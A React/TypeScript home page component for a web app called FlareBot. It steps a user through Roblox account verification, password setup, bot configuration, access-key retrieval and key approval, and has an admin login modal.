import { useState } from "react";
import { useLocation } from "wouter";
import VerificationForm from "@/components/verification-form";
import VerificationCode from "@/components/verification-code";
import PasswordSet from "@/components/PasswordSet";
import BotSelection from "@/components/bot-selection";
import BotConfig from "@/components/bot-config";
import AdminLogin from "@/components/admin-login";
import KeySubmission from "@/components/key-submission";
import GameAccess from "@/components/game-access";
import FeaturesShowcase from "@/components/features-showcase";
import { Button } from "@/components/ui/button";
import { Bot, Shield, User } from "lucide-react";
import type { VerificationSession, BotConfiguration } from "@/lib/types";

export default function Home() {
  const [, setLocation] = useLocation();
  const [currentStep, setCurrentStep] = useState<"verification" | "code" | "password" | "bot-selection" | "config" | "success" | "key-submission" | "game-access">("verification");
  const [verificationSession, setVerificationSession] = useState<VerificationSession | null>(null);
  const [botConfig, setBotConfig] = useState<BotConfiguration | null>(null);
  const [showAdminLogin, setShowAdminLogin] = useState(false);
  const [accessLink, setAccessLink] = useState<string>("");
  const [accessKey, setAccessKey] = useState<string>("");
  const [keySubmissionId, setKeySubmissionId] = useState<string>("");
  const [selectedBot, setSelectedBot] = useState<string>("");

  const handleVerificationSuccess = (session: VerificationSession) => {
    setVerificationSession(session);
    setCurrentStep("code");
  };

  const handleCodeVerified = () => {
    setCurrentStep("password");
  };

  const handlePasswordSet = () => {
    setCurrentStep("bot-selection");
  };

  const handleBotSelected = (botName: string) => {
    setSelectedBot(botName);
    setCurrentStep("config");
  };

  const handleConfigComplete = (config: BotConfiguration) => {
    setBotConfig(config);
    setCurrentStep("success");
  };

  const handleGetAccessKey = async () => {
    if (!verificationSession) return;
    
    try {
      const response = await fetch(`/api/generate-link/${verificationSession.sessionId}`, {
        method: 'POST',
      });
      
      if (response.ok) {
        const { accessLink: link, accessKey: key, keySubmissionId: submissionId } = await response.json();
        setAccessLink(link);
        setAccessKey(key);
        setKeySubmissionId(submissionId);
        setCurrentStep("key-submission");
      }
    } catch (error) {
      console.error('Failed to generate access link:', error);
    }
  };

  const handleKeySubmitted = (approved: boolean) => {
    if (approved) {
      setCurrentStep("game-access");
    }
  };

  return (
    <div className="font-roboto bg-gray-50 min-h-screen">
      {/* Header */}
      <header className="bg-white shadow-sm border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <div className="flex items-center space-x-3">
              <div className="w-8 h-8 bg-primary rounded-lg flex items-center justify-center">
                <Bot className="text-white h-4 w-4" />
              </div>
              <h1 className="text-xl font-medium text-gray-900">FlareBot</h1>
            </div>
            <div className="flex items-center space-x-4">
              <Button
                variant="ghost"
                onClick={() => setShowAdminLogin(true)}
                className="text-gray-500 hover:text-primary"
                data-testid="button-admin-login"
              >
                <User className="mr-2 h-4 w-4" />
                Admin
              </Button>
              <div className="flex items-center space-x-2 text-sm text-gray-500">
                <div className="w-2 h-2 bg-success rounded-full"></div>
                <span>System Online</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {currentStep === "verification" && (
          <div className="space-y-8">
            <div className="text-center">
              <h2 className="text-3xl font-bold text-gray-900 mb-4">Roblox Account Verification</h2>
              <p className="text-lg text-gray-600 max-w-2xl mx-auto">
                Verify your Roblox account to access FlareBot features and receive your unique verification code.
              </p>
            </div>
            <VerificationForm onSuccess={handleVerificationSuccess} />
          </div>
        )}

        {currentStep === "code" && verificationSession && (
          <VerificationCode 
            session={verificationSession} 
            onVerified={handleCodeVerified}
          />
        )}

        {currentStep === "password" && verificationSession && (
          <div className="space-y-8">
            <div className="text-center">
              <h2 className="text-3xl font-bold text-gray-900 mb-4">Set Your Password</h2>
              <p className="text-lg text-gray-600 max-w-2xl mx-auto">
                Create a secure password to protect your account. Your password must be at least 8 characters long and contain both uppercase and lowercase letters.
              </p>
            </div>
            <div className="max-w-md mx-auto bg-white rounded-lg shadow-md p-8">
              <PasswordSet 
                sessionId={verificationSession.sessionId} 
                onPasswordSet={handlePasswordSet}
              />
            </div>
          </div>
        )}

        {currentStep === "config" && verificationSession && (
          <BotConfig 
            sessionId={verificationSession.sessionId}
            onComplete={handleConfigComplete}
          />
        )}

        {currentStep === "success" && (
          <div className="text-center space-y-6">
            <div className="max-w-md mx-auto bg-white rounded-lg shadow-md p-8">
              <div className="w-20 h-20 bg-success rounded-full flex items-center justify-center mx-auto mb-6">
                <Bot className="text-white h-8 w-8" />
              </div>
              <h3 className="text-2xl font-bold text-gray-900 mb-4">Configuration Complete!</h3>
              <p className="text-gray-600 mb-6">
                Your bot has been configured successfully. Click the button below to retrieve your access key.
              </p>
              <Button
                onClick={handleGetAccessKey}
                className="w-full bg-secondary hover:bg-secondary-dark text-white"
                data-testid="button-get-access-key"
              >
                <Shield className="mr-2 h-4 w-4" />
                Get Access Key
              </Button>
            </div>
          </div>
        )}

        {currentStep === "key-submission" && verificationSession && (
          <KeySubmission
            sessionId={verificationSession.sessionId}
            accessLink={accessLink}
            accessKey={accessKey}
            keySubmissionId={keySubmissionId}
            onSubmitted={handleKeySubmitted}
          />
        )}

        {currentStep === "game-access" && (
          <GameAccess
            keySubmissionId={keySubmissionId}
            onReturnToDashboard={() => setCurrentStep("verification")}
          />
        )}
      </div>

      {/* Admin Login Modal */}
      {showAdminLogin && (
        <AdminLogin 
          onClose={() => setShowAdminLogin(false)}
          onSuccess={() => {
            setShowAdminLogin(false);
            setLocation("/admin");
          }}
        />
      )}
    </div>
  );
}
